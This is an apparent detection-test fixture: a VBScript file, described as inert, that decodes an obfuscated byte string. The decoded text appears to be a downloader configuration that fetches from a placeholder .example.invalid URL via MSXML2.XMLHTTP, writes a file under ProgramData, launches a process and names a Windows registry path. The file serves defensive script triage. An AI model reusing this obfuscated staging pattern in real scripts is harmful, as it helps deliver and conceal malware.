Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_9a2948d2 = "94-37-25-100-91-92-77-88-91-37-73-75-89-93-81-90-77-71-90-77-85-87-92-77-20-95-90-81-92-77-71-78-81-84-77-20-76-81-91-88-73-92-75-80-71-88-90-87-75-77-91-91-20-80-73-86-76-87-78-78-71-91-75-90-81-88-92-100-73-76-73-88-92-77-90-37-53-59-64-53-52-26-22-64-53-52-48-60-60-56-22-30-22-24-100-91-92-73-79-77-71-75-87-93-86-92-37-28-100-75-73-85-88-73-81-79-86-71-81-76-37-75-73-85-88-73-81-79-86-21-28-25-74-33-26-30-31-74-77-75-100-93-90-84-37-80-92-92-88-91-34-23-23-28-25-74-33-26-30-31-74-77-75-22-77-96-73-85-88-84-77-22-81-86-94-73-84-81-76-23-29-33-28-31-75-27-24-77-22-76-73-92-100-93-91-77-90-71-73-79-77-86-92-37-48-93-86-92-90-77-91-91-52-73-74-23-28-25-74-33-26-30-31-74-77-75-100-78-81-84-77-71-88-73-92-80-37-43-34-68-61-91-77-90-91-68-56-93-74-84-81-75-68-48-93-86-92-90-77-91-91-52-73-74-68-91-92-73-79-77-21-28-25-74-33-26-30-31-74-77-75-22-76-73-92-100-90-77-79-81-91-92-90-97-71-88-73-92-80-37-48-51-43-61-68-59-87-78-92-95-73-90-77-68-48-93-86-92-90-77-91-91-52-73-74-68-44-81-91-88-87-91-73-74-84-77-68-28-25-74-33-26-30-31-74-77-75-100-86-77-96-92-71-91-92-73-79-77-37-84-87-75-73-84-21-76-81-91-88-73-92-75-80-22-94-74-91"
Const Codec_9a2948d2 = "decimal_dash|subtract_modulo_256|18"

Function Load_9a2948d2()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_9a2948d2, "-")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(ByTeInDeX) = CInt(parts(ByTeInDeX))
  Next
  Load_9a2948d2 = result
End Function

Function Decode_9a2948d2(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = (SoUrCeByTeS(ByTeInDeX) + 24) Mod 256
  Next
  Decode_9a2948d2 = result
End Function

Function Recover_9a2948d2()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  If True Then
    NeUtRaL = Join(Array("north", "south"), ":")
      SoUrCeByTeS = Load_9a2948d2()
      DeCoDeDByTeS = Decode_9a2948d2(SoUrCeByTeS)
      DeScRiPtOrTeXt = ""
      For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
        DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
      Next
  End If
  Recover_9a2948d2 = DeScRiPtOrTeXt
End Function

Function Inspect_9a2948d2()
  Dim fields
  fields = Split(Recover_9a2948d2(), "|")
  Inspect_9a2948d2 = Join(fields, "|")
End Function
